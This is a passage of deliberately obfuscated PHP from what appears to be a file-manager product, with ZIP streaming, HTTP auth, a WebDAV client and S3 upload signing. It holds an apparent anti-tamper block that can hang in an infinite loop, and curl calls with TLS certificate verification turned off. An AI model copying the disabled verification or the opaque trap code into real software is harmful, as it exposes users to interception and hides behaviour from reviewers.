array($B‡Ùš«¿àî[1988], 4294967295), array($B‡Ùš«¿àî[1989], $dèãŞ‡ùÃ¿), array($B‡Ùš«¿àî[1989], 32)); $C¬››¡í÷ = array(array($B‡Ùš«¿àî[1989], 1), array($B‡Ùš«¿àî[1989], 28), array($B‡Ùš«¿àî[1990], 0), array($B‡Ùš«¿àî[1990], 0), array($B‡Ùš«¿àî[1990], 0), array($B‡Ùš«¿àî[1988], 0)); goto fÍŠ²Šî¾¢; bïö‚ÁêéÍ: return strlen($F—”õ±¶åÑ) + $dèãŞ‡ùÃ¿ + strlen($A…‚±§¾Š¢); goto cç’Á‰‚¹ô; cç’Á‰‚¹ô: } protected function addFileFooter($eå‘¶œÒˆ¹, $cÎÀö–©Éö, $d¿„áó‘Óá, $EÆ¯‹È‰ã, $C¢”ÉŸÃÚ¹, $eèÕ…œÁ¾¿) { $dª¡çê’†¼ =& $_SERVER[Äº¡•ô™Ÿ]; $E˜¸Ô»éßã = array(array($dª¡çê’†¼[1988], static::DATA_DESCRIPTOR_SIGNATURE), array($dª¡çê’†¼[1988], $d¿„áó‘Óá), array($dª¡çê’†¼[1990], $EÆ¯‹È‰ã), array($dª¡çê’†¼[1990], $C¢”ÉŸÃÚ¹)); $bˆëôõ±‘ = $this->packFields($E˜¸Ô»éßã); $this->send($bˆëôõ±‘); $aœƒ¤ŸÑä = $eèÕ…œÁ¾¿ + $EÆ¯‹È‰ã + $AïêàåÄŒš; $this->addToCdr($eå‘¶œÒˆ¹, $cÎÀö–©Éö, $d¿„áó‘Óá, $EÆ¯‹È‰ã, $C¢”ÉŸÃÚ¹, $aœƒ¤ŸÑä); } private function addToCdr($A‚ÖìĞí£«, $dé·¾³³ˆ, $fÆÏ„†øÃ, $eº­“É‘Û¦, $D»’ËÁÂÉ­, $b°×‘®†“) { $this->files[] = array($A‚ÖìĞí£«, $dé·¾³³ˆ, $fÆÏ„†øÃ, $eº­“É‘Û¦, $D»’ËÁÂÉ­, $this->ofs); $this->ofs += $b°×‘®†“; } protected function addCdrFile($FãøœÑ°àê) { goto EøÉÃÎ•ÅŸ; d´Ö¿“ÎÊß: $fËõóßÖæç = $this->packFields($aßŞ«ö‰éè); $F²Á“¬˜†Â = $this->packFields($D¤¥Ò›‰‰Ù); $BŸ«§¦â’ = $fËõóßÖæç . $bõãÁ±Ş…« . $Fö¾‡ãÒÉ . $F²Á“¬˜†Â; goto a³šº¤íéæ; c¨œ®åË: $CĞïÃêƒÅÁ = $this->dosTime(time()); $aßŞ«ö‰éè = array(array($b…ÃÖ‰”‹±[1988], static::CDR_FILE_SIGNATURE), array($b…ÃÖ‰”‹±[1989], static::ZIP_VERSION_64), array($b…ÃÖ‰”‹±[1989], static::ZIP_VERSION_64), array($b…ÃÖ‰”‹±[1989], 8), array($b…ÃÖ‰”‹±[1989], $AÄ…¹ƒˆµó), array($b…ÃÖ‰”‹±[1988], $CĞïÃêƒÅÁ), array($b…ÃÖ‰”‹±[1988], $f£õ–‹ÛˆÕ), array($b…ÃÖ‰”‹±[1988], 4294967295), array($b…ÃÖ‰”‹±[1988], 4294967295), array($b…ÃÖ‰”‹±[1989], strlen($bõãÁ±Ş…«)), array($b…ÃÖ‰”‹±[1989], 32), array($b…ÃÖ‰”‹±[1989], strlen($Fö¾‡ãÒÉ)), array($b…ÃÖ‰”‹±[1989], 0), array($b…ÃÖ‰”‹±[1989], 0), array($b…ÃÖ‰”‹±[1988], 32), array($b…ÃÖ‰”‹±[1988], 4294967295)); $D¤¥Ò›‰‰Ù = array(array($b…ÃÖ‰”‹±[1989], 1), array($b…ÃÖ‰”‹±[1989], 28), array($b…ÃÖ‰”‹±[1990], $Dš¹ªãÑØ), array($b…ÃÖ‰”‹±[1990], $cÌ­² ‹ß‘), array($b…ÃÖ‰”‹±[1990], $AÂ÷Ò°øá×), array($b…ÃÖ‰”‹±[1988], 0)); goto d´Ö¿“ÎÊß; a³šº¤íéæ: $this->send($BŸ«§¦â’); $this->cdr_ofs += strlen($BŸ«§¦â’); goto eëÎ”ÇàÁ¥; EøÉÃÎ•ÅŸ: $b…ÃÖ‰”‹± =& $_SERVER[Äº¡•ô™Ÿ]; list($bõãÁ±Ş…«, $AÄ…¹ƒˆµó, $f£õ–‹ÛˆÕ, $cÌ­² ‹ß‘, $Dš¹ªãÑØ, $AÂ÷Ò°øá×) = $FãøœÑ°àê; $Fö¾‡ãÒÉ = $b…ÃÖ‰”‹±[33]; goto c¨œ®åË; eëÎ”ÇàÁ¥: } protected function addCdr64Eof() { goto e¼‚ÒÎâÑÑ; e¼‚ÒÎâÑÑ: $A·Ò·„›‹Ş =& $_SERVER[Äº¡•ô™Ÿ]; $f·‡î¸íÆ¾ = count($this->files); $dÅê“ãÚˆ¹ = $this->cdr_ofs; goto F®¯Ö“†ÛÚ; F®¯Ö“†ÛÚ: $cÄöøµ’®Ş = $this->ofs; $Aë…«Äİ‡Ò = array(array($A·Ò·„›‹Ş[1988], static::ZIP64_CDR_EOF_SIGNATURE), array($A·Ò·„›‹Ş[1990], 44), array($A·Ò·„›‹Ş[1989], static::ZIP_VERSION_64), array($A·Ò·„›‹Ş[1989], static::ZIP_VERSION_64), array($A·Ò·„›‹Ş[1988], 0), array($A·Ò·„›‹Ş[1988], 0), array($A·Ò·„›‹Ş[1990], $f·‡î¸íÆ¾), array($A·Ò·„›‹Ş[1990], $f·‡î¸íÆ¾), array($A·Ò·„›‹Ş[1990], $dÅê“ãÚˆ¹), array($A·Ò·„›‹Ş[1990], $cÄöøµ’®Ş)); $d–Ğ÷‚ = $this->packFields($Aë…«Äİ‡Ò); goto fĞ·ãÂÍ±; fĞ·ãÂÍ±: $this->send($d–Ğ÷‚); goto dÖ¶“Í¾ß; dÖ¶“Í¾ß: } protected function addCdr64Locator() { goto A›Ï¬’È©; AÑ‘òÜòÂÎ: $Bêõ±¡ƒ²ø = $this->ofs; $d»ŠÓàÙ‘ = array(array($A·®¯¾â°»[1988], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($A·®¯¾â°»[1988], 0), array($A·®¯¾â°»[1990], $Bêõ±¡ƒ²ø + $aá†Ú¥ç¬), array($A·®¯¾â°»[1988], 1)); $eğíÀ¡ëÅŒ = $this->packFields($d»ŠÓàÙ‘); goto Díõ¿·ÖÁ·; A›Ï¬’È©: $A·®¯¾â°» =& $_SERVER[Äº¡•ô™Ÿ]; $AÇæøğˆÆø = count($this->files); $aá†Ú¥ç¬ = $this->cdr_ofs; goto AÑ‘òÜòÂÎ; Díõ¿·ÖÁ·: $this->send($eğíÀ¡ëÅŒ); goto dŒ¯‹ò»×Ê; dŒ¯‹ò»×Ê: } protected function addCdrEof() { goto a©ĞÒÛğ‚Û; dÄóÒğ®¹: $dÍ“¹É§„¢ = $this->ofs; $aÑÃ¡º øñ = $cƒãİñâ£•[33]; $Fˆ¡ì•”±ï = array(array($cƒãİñâ£•[1988], static::CDR_EOF_SIGNATURE), array($cƒãİñâ£•[1989], 0), array($cƒãİñâ£•[1989], 0), array($cƒãİñâ£•[1989], $b…‚Ï´˜·î), array($cƒãİñâ£•[1989], $b…‚Ï´˜·î), array($cƒãİñâ£•[1988], 4294967295), array($cƒãİñâ£•[1988], 4294967295), array($cƒãİñâ£•[1989], strlen($aÑÃ¡º øñ))); goto d‡‰×·…¦¾; d‡‰×·…¦¾: $D¸‰Ë„² = $this->packFields($Fˆ¡ì•”±ï) . $aÑÃ¡º øñ; $this->send($D¸‰Ë„²); goto dÉÁŞ ¼ª; a©ĞÒÛğ‚Û: $cƒãİñâ£• =& $_SERVER[Äº¡•ô™Ÿ]; $b…‚Ï´˜·î = count($this->files); $DÌÇã×Ìˆ£ = $this->cdr_ofs; goto dÄóÒğ®¹; dÉÁŞ ¼ª: } protected function addCdr() { foreach ($this->files as $c÷µîáéÌÂ) { $this->addCdrFile($c÷µîáéÌÂ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $cÓœ°—‘’· =& $_SERVER[Äº¡•ô™Ÿ]; $fâôˆæ¾ÔŞ = $cÓœ°—‘’·[199]; if ($this->outputName) { $fé´á¸Ò½ô = trim(str_replace(array($cÓœ°—‘’·[113], $cÓœ°—‘’·[55], $cÓœ°—‘’·[95], $cÓœ°—‘’·[67], $cÓœ°—‘’·[214], $cÓœ°—‘’·[992]), $cÓœ°—‘’·[33], $this->outputName)); $A«…œ«…Ë = rawurlencode($fé´á¸Ò½ô); $fâôˆæ¾ÔŞ .= "\73\x20\x66\x69\154\145\x6e\141\x6d\x65\x2a\x3d\x75\164\146\55\x38\x27\47{$A«…œ«…Ë}"; } $C™‡²¨ïá = array($cÓœ°—‘’·[196] => $cÓœ°—‘’·[1991], $cÓœ°—‘’·[1992] => $fâôˆæ¾ÔŞ, $cÓœ°—‘’·[1993] => $cÓœ°—‘’·[1994], $cÓœ°—‘’·[1995] => $cÓœ°—‘’·[1996], $cÓœ°—‘’·[1997] => $cÓœ°—‘’·[1998]); foreach ($C™‡²¨ïá as $Aˆâôãï => $Eô”ìá¿‡œ) { header($Aˆâôãï . $cÓœ°—‘’·[882] . $Eô”ìá¿‡œ); } } protected function send($e—´ËÄ… ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $e—´ËÄ… ); } protected final function dosTime($C†¨Ÿ›™¼) { $aŠ×ÔÏáÍ =& $_SERVER[Äº¡•ô™Ÿ]; $f—¡¤éñğ = getdate($C†¨Ÿ›™¼); if ($f—¡¤éñğ[$aŠ×ÔÏáÍ[1701]] < 1980) { $f—¡¤éñğ = array($aŠ×ÔÏáÍ[1701] => 1980, $aŠ×ÔÏáÍ[1999] => 1, $aŠ×ÔÏáÍ[2000] => 1, $aŠ×ÔÏáÍ[2001] => 0, $aŠ×ÔÏáÍ[2002] => 0, $aŠ×ÔÏáÍ[2003] => 0); } $f—¡¤éñğ[$aŠ×ÔÏáÍ[1701]] -= 1980; return $f—¡¤éñğ[$aŠ×ÔÏáÍ[1701]] << 25 | $f—¡¤éñğ[$aŠ×ÔÏáÍ[1999]] << 21 | $f—¡¤éñğ[$aŠ×ÔÏáÍ[2000]] << 16 | $f—¡¤éñğ[$aŠ×ÔÏáÍ[2001]] << 11 | $f—¡¤éñğ[$aŠ×ÔÏáÍ[2002]] << 5 | $f—¡¤éñğ[$aŠ×ÔÏáÍ[2003]] >> 1; } protected function packFields($Dè‚Õ‹Í½) { $c”¬äğ¯Œ =& $_SERVER[Äº¡•ô™Ÿ]; $cŞ¦É’›ê = $c”¬äğ¯Œ[33]; $E¤ï‘ìä°ó = array(); foreach ($Dè‚Õ‹Í½ as $D¥œ‘‚Ç«ó) { $cŞ¦É’›ê .= $D¥œ‘‚Ç«ó[0]; $E¤ï‘ìä°ó[] = $D¥œ‘‚Ç«ó[1]; } array_unshift($E¤ï‘ìä°ó, $cŞ¦É’›ê); return call_user_func_array($c”¬äğ¯Œ[2004], $E¤ï‘ìä°ó); } protected function filterFilename($AÜ×øŒ‡èÂ) { $BÎ›ÒìÜÉ× =& $_SERVER[Äº¡•ô™Ÿ]; return str_replace(array($BÎ›ÒìÜÉ×[95], $BÎ›ÒìÜÉ×[4], $BÎ›ÒìÜÉ×[173], $BÎ›ÒìÜÉ×[69], $BÎ›ÒìÜÉ×[113], $BÎ›ÒìÜÉ×[927], $BÎ›ÒìÜÉ×[930], $BÎ›ÒìÜÉ×[268]), $BÎ›ÒìÜÉ×[70], $AÜ×øŒ‡èÂ); } } class ZipStream { } goto A¯ª’¬–“¨; bÑåä’í»: class HttpAuth { public static function get() { $a¨‚ˆâç =& $_SERVER[Äº¡•ô™Ÿ]; $c¤Ïë¤à•æ = $a¨‚ˆâç[33]; $FØÙ Û±Ì = $a¨‚ˆâç[33]; if (isset($_SERVER[$a¨‚ˆâç[1735]])) { $c¤Ïë¤à•æ = $_SERVER[$a¨‚ˆâç[1735]]; $FØÙ Û±Ì = $_SERVER[$a¨‚ˆâç[1736]]; } elseif (isset($_SERVER[$a¨‚ˆâç[1737]])) { $C­²ÔÒ‰ìÜ = $_SERVER[$a¨‚ˆâç[1737]]; if (strpos(strtolower($C­²ÔÒ‰ìÜ), $a¨‚ˆâç[1738]) === 0) { $c…ÊÀŠ ¼ = explode($a¨‚ˆâç[4], base64_decode(substr($C­²ÔÒ‰ìÜ, 6))); $c¤Ïë¤à•æ = isset($c…ÊÀŠ ¼[0]) ? $c…ÊÀŠ ¼[0] : $a¨‚ˆâç[33]; $FØÙ Û±Ì = isset($c…ÊÀŠ ¼[1]) ? $c…ÊÀŠ ¼[1] : 0; } } return array($a¨‚ˆâç[531] => $c¤Ïë¤à•æ, $a¨‚ˆâç[899] => $FØÙ Û±Ì); } public static function error() { goto B™ä»İŒß; B‘Ö’ÃÂª: die; goto Dëç‡Òñï; d„ùáÛ±»¡: header($eƒÌ®Ğ„ŒÅ[1741]); header($eƒÌ®Ğ„ŒÅ[1742]); header($eƒÌ®Ğ„ŒÅ[1257]); goto B‘Ö’ÃÂª; B™ä»İŒß: $eƒÌ®Ğ„ŒÅ =& $_SERVER[Äº¡•ô™Ÿ]; header($eƒÌ®Ğ„ŒÅ[1739]); header($eƒÌ®Ğ„ŒÅ[1740]); goto d„ùáÛ±»¡; Dëç‡Òñï: } public static function make($DùÄ°°™, $aØõ§ê¾„ğ) { $DæÍ““†¼á =& $_SERVER[Äº¡•ô™Ÿ]; return $DæÍ““†¼á[1743] + base64_encode($DùÄ°°™ . $DæÍ““†¼á[4] . $aØõ§ê¾„ğ); } } if (!isset($_SERVER[$_SERVER[Äº¡•ô™Ÿ][789]]) || !isset($_SERVER[$_SERVER[Äº¡•ô™Ÿ][1205]])) { goto bêé„¸çö; FãÓ»¤»³ƒ: $A·Òíà‹ò = explode($_SERVER[Äº¡•ô™Ÿ][214], $D À‡õší­); if (count($A·Òíà‹ò) < $_SERVER[Äº¡•ô™Ÿ][561]) { $f¸¨„£ÂŸ = $_SERVER[Äº¡•ô™Ÿ][795]; $f¸¨„£ÂŸ(); } $b‹ç¿Ö´ = $_SERVER[Äº¡•ô™Ÿ][1204]; goto eôµêÉå‚£; eôµêÉå‚£: $b‹ç¿Ö´($_SERVER[$_SERVER[Äº¡•ô™Ÿ][793]] . $_SERVER[Äº¡•ô™Ÿ][794]); $F“èŸ¸éå = 2; while ($F“èŸ¸éå > 1) { $EÖÚùíôºÍ = rawurlencode($F“èŸ¸éå . $_SERVER[Äº¡•ô™Ÿ][358]); } goto C¦‹Ô¹½¨; bêé„¸çö: $bàŠ‡ö¬—ó = $_SERVER[Äº¡•ô™Ÿ][792]; $f­À½æˆ = $_SERVER[$_SERVER[Äº¡•ô™Ÿ][793]] . $_SERVER[Äº¡•ô™Ÿ][794]; $D À‡õší­ = $bàŠ‡ö¬—ó($f­À½æˆ); goto FãÓ»¤»³ƒ; C¦‹Ô¹½¨: } class HttpDavClient { public function __construct($A¬ŒÆ‰ÛôÙ, $Bİ¿«‰˜œ­, $dÓ·‰Ÿ¢°) { $this->header = array(); $this->userName = $Bİ¿«‰˜œ­; $this->userPassowrd = $dÓ·‰Ÿ¢°; } protected function makePath($A’¯ŞÇ©©) { return $A’¯ŞÇ©©; } protected function setHeader($e…»»½†³, $eªß¹¥˜” = false) { if ($eªß¹¥˜” === !1) { $this->header[] = $e…»»½†³; } else { $this->header[] = $e…»»½†³ . $_SERVER[Äº¡•ô™Ÿ][882] . $eªß¹¥˜”; } } public function move($f±ñİÓàÂ­, $cÃŠÏ Ä°, $Fé¨¤ù½Ò» = '') { $A‚Ï ƒÇì´ =& $_SERVER[Äº¡•ô™Ÿ]; $this->setHeader($A‚Ï ƒÇì´[1744], $this->makePath($cÃŠÏ Ä°)); $this->setHeader($A‚Ï ƒÇì´[1745], $A‚Ï ƒÇì´[1746]); if ($Fé¨¤ù½Ò») { $this->setHeader($A‚Ï ƒÇì´[1747], $A‚Ï ƒÇì´[927] . $Fé¨¤ù½Ò» . $A‚Ï ƒÇì´[930]); } return $this->send($A‚Ï ƒÇì´[1748], $f±ñİÓàÂ­); } public function copy($bÇäíÚ®•í, $aë»á·å¬‡) { $c„¤¬¢´¾© =& $_SERVER[Äº¡•ô™Ÿ]; $this->setHeader($c„¤¬¢´¾©[1744], $this->makePath($aë»á·å¬‡)); $this->setHeader($c„¤¬¢´¾©[1745], $c„¤¬¢´¾©[1746]); return $this->send($c„¤¬¢´¾©[1749], $bÇäíÚ®•í); } public function mkcol($CÈŞŠ¹Î§¹) { $bçÅ‰õµ =& $_SERVER[Äº¡•ô™Ÿ]; $this->setHeader($bçÅ‰õµ[1745], $bçÅ‰õµ[1746]); return $this->send($bçÅ‰õµ[1750], $CÈŞŠ¹Î§¹); } public function delete($aŠÈ‰Áñ½, $EøšóÈö¿ƒ = '') { $d§·ßïÊµù =& $_SERVER[Äº¡•ô™Ÿ]; if ($EøšóÈö¿ƒ) { $this->setHeader($d§·ßïÊµù[1747], $d§·ßïÊµù[927] . $EøšóÈö¿ƒ . $d§·ßïÊµù[930]); } return $this->send($d§·ßïÊµù[1245], $aŠÈ‰Áñ½); } public function propfind($E¦›Îëˆ¼) { $FÑíË¾ñÑ¿ =& $_SERVER[Äº¡•ô™Ÿ]; $this->setHeader($FÑíË¾ñÑ¿[1751], $FÑíË¾ñÑ¿[83]); $this->setHeader($FÑíË¾ñÑ¿[1752], $FÑíË¾ñÑ¿[1753]); $E‡è»¬ßŠù = $FÑíË¾ñÑ¿[1754]; return $this->send($FÑíË¾ñÑ¿[1755], $E¦›Îëˆ¼, $E‡è»¬ßŠù); } public function options($EÒ˜¶ùÃ©µ) { return $this->send($_SERVER[Äº¡•ô™Ÿ][1756], $EÒ˜¶ùÃ©µ); } public function get($bÜäâé•äÒ) { return $this->send($_SERVER[Äº¡•ô™Ÿ][213], $bÜäâé•äÒ); } public function put($aç¾ŠİÛÜ‡, $cï×¤œÈ³, $D×ŒãÕëî = '') { $bñÎùø½Ë =& $_SERVER[Äº¡•ô™Ÿ]; if ($D×ŒãÕëî) { $this->setHeader($bñÎùø½Ë[1747], $bñÎùø½Ë[927] . $D×ŒãÕëî . $bñÎùø½Ë[930]); } return $this->send($bñÎùø½Ë[211], $aç¾ŠİÛÜ‡, $cï×¤œÈ³); } protected function send($D²Ï›ËÒ, $dÈÚ”æäŸº, $aŒÀ×¸‚¶Ê = false, $CéäŠÜğ = false) { goto FâÜ·ëÁ‚; fŒñàÂ: curl_setopt($EØË÷¤¸º, CURLOPT_SSL_VERIFYPEER, !1); curl_setopt($EØË÷¤¸º, CURLOPT_SSL_VERIFYHOST, !1); $DÂ”£Ëï¾Å = curl_exec($EØË÷¤¸º); goto c¡Æê„¥ó; c¡Æê„¥ó: $this->header = array(); return $DÂ”£Ëï¾Å; goto bï·è‰×ˆ; cßÅµ»¿±: $this->setHeader($aÎœÙ†©Ê); if ($aŒÀ×¸‚¶Ê) { $aŒÀ×¸‚¶Ê = $F äº´ç £[1758] . $aŒÀ×¸‚¶Ê; } if (!request_url_safe($dÈÚ”æäŸº)) { return !1; } goto bğÎËğ®¾ì; FâÜ·ëÁ‚: $F äº´ç £ =& $_SERVER[Äº¡•ô™Ÿ]; $aÎœÙ†©Ê = HttpAuth::make($this->userName, $this->userPassowrd); $this->setHeader($F äº´ç £[1757], $F äº´ç £[50]); goto cßÅµ»¿±; bğÎËğ®¾ì: $EØË÷¤¸º = curl_init($dÈÚ”æäŸº); curl_setopt($EØË÷¤¸º, CURLOPT_CUSTOMREQUEST, $D²Ï›ËÒ); curl_setopt($EØË÷¤¸º, CURLOPT_HTTPAUTH, CURLAUTH_ANY); goto C©š¯Ö£²¶; C©š¯Ö£²¶: curl_setopt($EØË÷¤¸º, CURLOPT_HTTPHEADER, $this->header); curl_setopt($EØË÷¤¸º, CURLOPT_RETURNTRANSFER, !0); curl_setopt($EØË÷¤¸º, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); goto fŒñàÂ; bï·è‰×ˆ: } } goto c¹©…ö¡ÑÄ; aÖ§¹Ó”áè: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($e¾ä³Àõáô) { parent::__construct($e¾ä³Àõáô); } public function uploadFormData($f‹œÛ‹™˜, $f„Şî Î‘´ = 3600) { goto Có¸³‰—„±; aŸÅÀŠœì§: $bÀŸøßÃà = hash_hmac($eÇÌµïŠ‚º[1136], $B÷¼–Åø×®, $d²“´Şø, !0); $dÆ†¼Šò—ó = hash_hmac($eÇÌµïŠ‚º[1136], $E’µîÅˆÑ’, $bÀŸøßÃà, !0); $fŞ¸Ã•ŒÅê = hash_hmac($eÇÌµïŠ‚º[1136], $cà“ŠëÑ‘, $dÆ†¼Šò—ó); goto fŞ…Ø°£ŸĞ; EÜµÊïë­: $cà“ŠëÑ‘ = base64_encode(json_encode($b«÷Ö‹‚‚Ä)); $eƒ¦ñ†¡ğ› = hash_hmac($eÇÌµïŠ‚º[1136], $B ‰’œóÊŒ, $eÇÌµïŠ‚º[1137] . $this->secret, !0); $d²“´Şø = hash_hmac($eÇÌµïŠ‚º[1136], $this->region, $eƒ¦ñ†¡ğ›, !0); goto aŸÅÀŠœì§; A©º©Ü‹®: $F³Ÿ–©Óì = array($this->accessKey, $B ‰’œóÊŒ, $this->region, $B÷¼–Åø×®, $E’µîÅˆÑ’); $dÚç„ÙÈÁ = implode($eÇÌµïŠ‚º[8], $F³Ÿ–©Óì); $b«÷Ö‹‚‚Ä = array($eÇÌµïŠ‚º[1095] => gmdate($eÇÌµïŠ‚º[1094], strtotime($eÇÌµïŠ‚º[1129])), $eÇÌµïŠ‚º[1096] => array(array($eÇÌµïŠ‚º[1098] => $this->bucket), array($eÇÌµïŠ‚º[1097] => $déÁµöˆß), array($eÇÌµïŠ‚º[1099], $eÇÌµïŠ‚º[1100], $eÇÌµïŠ‚º[33]), array($eÇÌµïŠ‚º[1099], $eÇÌµïŠ‚º[1130], $eÇÌµïŠ‚º[33]), array($eÇÌµïŠ‚º[1099], $eÇÌµïŠ‚º[1131], $eÇÌµïŠ‚º[33]), array($eÇÌµïŠ‚º[1101] => $F°ËàÕ¡¾), array($eÇÌµïŠ‚º[1132] => $dÚç„ÙÈÁ), array($eÇÌµïŠ‚º[1133] => $c¦ğ©¸½„÷), array($eÇÌµïŠ‚º[1134] => $c„ò™”»âÎ), array($eÇÌµïŠ‚º[1135] => $DÍ¼‰’‰))); goto EÜµÊïë­; Có¸³‰—„±: $eÇÌµïŠ‚º =& $_SERVER[Äº¡•ô™Ÿ]; $déÁµöˆß = $eÇÌµïŠ‚º[182]; $c¦ğ©¸½„÷ = $eÇÌµïŠ‚º[1126]; goto bîØÌ¾óŞ‚; A¾˜ÄÀò: $E’µîÅˆÑ’ = $eÇÌµïŠ‚º[1128]; $DÍ¼‰’‰ = $f„Şî Î‘´ . $eÇÌµïŠ‚º[33]; $F°ËàÕ¡¾ = $eÇÌµïŠ‚º[1093]; goto A©º©Ü‹®; fŞ…Ø°£ŸĞ: $c°Šì˜×«® = array($eÇÌµïŠ‚º[196] => $eÇÌµïŠ‚º[33], $eÇÌµïŠ‚º[1138] => $eÇÌµïŠ‚º[33], $eÇÌµïŠ‚º[1097] => $déÁµöˆß, $eÇÌµïŠ‚º[1101] => $F°ËàÕ¡¾, $eÇÌµïŠ‚º[1105] => $cà“ŠëÑ‘, $eÇÌµïŠ‚º[1139] => $dÚç„ÙÈÁ, $eÇÌµïŠ‚º[1140] => $c¦ğ©¸½„÷, $eÇÌµïŠ‚º[1141] => $c„ò™”»âÎ, $eÇÌµïŠ‚º[1142] => $DÍ¼‰’‰, $eÇÌµïŠ‚º[1143] => $fŞ¸Ã•ŒÅê, $eÇÌµïŠ‚º[166] => $this->getHost()); return $c°Šì˜×«®; goto A½¢•–Ë­Ÿ; bîØÌ¾óŞ‚: $B÷¼–Åø×® = $eÇÌµïŠ‚º[59]; $c„ò™”»âÎ = gmdate($eÇÌµïŠ‚º[1127]); $B ‰’œóÊŒ = gmdate($eÇÌµïŠ‚º[693]); goto A¾˜ÄÀò; A½¢•–Ë­Ÿ: } public function multiUploadFormData($AÇÈğˆ×ëŸ, $F‰“ŠëË‹ = 3600) { $CÑË”Å«„´ =& $_SERVER[Äº¡•ô™Ÿ]; $B‡§˜éÛ†‡ = gmdate($CÑË”Å«„´[1224]); $dŸ‰–ØÁ²× = array(); $AÔçÂ³ë¾ó = $this->client->getUploadId($this->bucket, $AÇÈğˆ×ëŸ, $dŸ‰–ØÁ²×); if (!$AÔçÂ³ë¾ó) { return !1; } return array($CÑË”Å«„´[206] => $AÔçÂ³ë¾ó, $CÑË”Å«„´[166] => $this->getHost() . $CÑË”Å«„´[8] . $this->pathEncode($AÇÈğˆ×ëŸ), $CÑË”Å«„´[207] => $B‡§˜éÛ†‡, $CÑË”Å«„´[89] => $AÇÈğˆ×ëŸ); } public function multiUploadAuthData($aˆÉÉ‹ªÕ±, $Aªâç¨ŒêŒ = array()) { goto CÔ£‹çÂ”‚; B „÷Ï²¼: unset($Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[89]]); if (isset($Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[208]])) { return $this->listUploadParts($E¾§Ö×µã´, $Aªâç¨ŒêŒ); } $BèíèÜÊ“ë = array(); goto bŒ„Ì‚–ó; CÔ£‹çÂ”‚: $bÃË´±ÂÉ¥ =& $_SERVER[Äº¡•ô™Ÿ]; $A‘é¬©„é° = isset($Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[157]]) ? $Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[157]] : $bÃË´±ÂÉ¥[33]; $E¾§Ö×µã´ = $Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[89]]; goto B „÷Ï²¼; bŒ„Ì‚–ó: if (isset($Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[1225]])) { $BèíèÜÊ“ë[$bÃË´±ÂÉ¥[1226]] = $Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[1225]]; } $a¯Ñ³Š¹©Â = explode($bÃË´±ÂÉ¥[168], $this->getHost()); $a´¯„§Ôèï = array($bÃË´±ÂÉ¥[1227] => $a¯Ñ³Š¹©Â[1], $bÃË´±ÂÉ¥[1228] => $bÃË´±ÂÉ¥[33], $bÃË´±ÂÉ¥[196] => $bÃË´±ÂÉ¥[116], $bÃË´±ÂÉ¥[1138] => $Aªâç¨ŒêŒ[$bÃË´±ÂÉ¥[77]]); goto aËâÎó°Éù; bÕ‹‹¼Ê™©: if (strpos($A‘é¬©„é°, $bÃË´±ÂÉ¥[210]) === 0) { if (isset($BèíèÜÊ“ë[$bÃË´±ÂÉ¥[1226]])) { $DÉÇÛ›Š‹ = $BèíèÜÊ“ë[$bÃË´±ÂÉ¥[1226]]; } else { if (isset($eõâÙÖŞ±Í[$bÃË´±ÂÉ¥[1226]])) { $DÉÇÛ›Š‹ = $eõâÙÖŞ±Í[$bÃË´±ÂÉ¥[1226]]; } else { $DÉÇÛ›Š‹ = hash($bÃË´±ÂÉ¥[1136], $bÃË´±ÂÉ¥[33]); } } return array($bÃË´±ÂÉ¥[217] => $eõâÙÖŞ±Í[$bÃË´±ÂÉ¥[217]], $bÃË´±ÂÉ¥[1226] => $DÉÇÛ›Š‹, $bÃË´±ÂÉ¥[207] => $eõâÙÖŞ±Í[$bÃË´±ÂÉ¥[1229]]); } return $eõâÙÖŞ±Í[$bÃË´±ÂÉ¥[217]]; goto aâó¡„Ë¡; aËâÎó°Éù: $f‡¸‹¸÷¯ï = $bÃË´±ÂÉ¥[211]; $cê«‰ë­–‡ = $bÃË´±ÂÉ¥[8] . $this->pathEncode($E¾§Ö×µã´) . $A‘é¬©„é°; $eõâÙÖŞ±Í = $this->client->__getSignatureV4($BèíèÜÊ“ë, $a´¯„§Ôèï, $f‡¸‹¸÷¯ï, $cê«‰ë­–‡); goto bÕ‹‹¼Ê™©; aâó¡„Ë¡: } public function listUploadParts($eöµëç„ÃË, $bî¸İÇ–í = array()) { goto aëŒšè«Å°; AºÖŞæäíÀ: $A¿¨¢ßÎšö = array($cª½ÙÚŒº[1227] => $B±Õ«ä¼İĞ[1], $cª½ÙÚŒº[196] => $cª½ÙÚŒº[116], $cª½ÙÚŒº[1138] => strlen($Cí¿ß—˜·ò)); $Bµ¢…Ş›—Á = $cª½ÙÚŒº[209]; $bÖ÷†êƒ†Â = $cª½ÙÚŒº[8] . $this->pathEncode($eöµëç„ÃË) . $bî¸İÇ–í[$cª½ÙÚŒº[157]]; goto E˜²‚‘­†š; AÉÙ˜äÇ”ï: $Cí¿ß—˜·ò .= $cª½ÙÚŒº[1233]; $f¤‡„›˜ğ = array(); $B±Õ«ä¼İĞ = explode($cª½ÙÚŒº[168], $this->getHost()); goto AºÖŞæäíÀ; aëŒšè«Å°: $cª½ÙÚŒº =& $_SERVER[Äº¡•ô™Ÿ]; $c¨À‹ÏåÍˆ = str_replace($cª½ÙÚŒº[218], $cª½ÙÚŒº[33], $bî¸İÇ–í[$cª½ÙÚŒº[157]]); $c¨Ùº¸“ß” = $this->client->listParts($this->bucket, $eöµëç„ÃË, $c¨À‹ÏåÍˆ); goto b±ÉÕ»¨; E˜²‚‘­†š: $bÏ–‡Ê’’ = $this->client->__getSignatureV4($f¤‡„›˜ğ, $A¿¨¢ßÎšö, $Bµ¢…Ş›—Á, $bÖ÷†êƒ†Â, $Cí¿ß—˜·ò); return array($cª½ÙÚŒº[217] => $bÏ–‡Ê’’[$cª½ÙÚŒº[217]], $cª½ÙÚŒº[207] => $bÏ–‡Ê’’[$cª½ÙÚŒº[1229]], $cª½ÙÚŒº[219] => 